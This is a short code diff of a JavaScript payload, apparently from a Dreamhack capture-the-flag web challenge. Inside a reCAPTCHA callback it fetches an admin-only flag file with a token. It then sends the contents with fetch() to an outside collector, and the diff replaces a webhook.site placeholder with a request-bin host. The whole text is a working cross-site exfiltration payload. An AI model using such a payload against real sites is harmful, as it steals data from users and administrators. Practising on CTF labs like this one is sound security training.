@@ -5,7 +5,7 @@ grecaptcha.ready(function() {
     fetch("/app/admin/flag.pdf?token=" + token)
       .then(r => r.text())
       .then(flag => {
-        fetch("https://webhook.site/본인주소?flag=" + encodeURIComponent(flag));
+        fetch("https://bcbbeeo.request.dreamhack.games/?flag=" + encodeURIComponent(flag));
       });
   });
 });
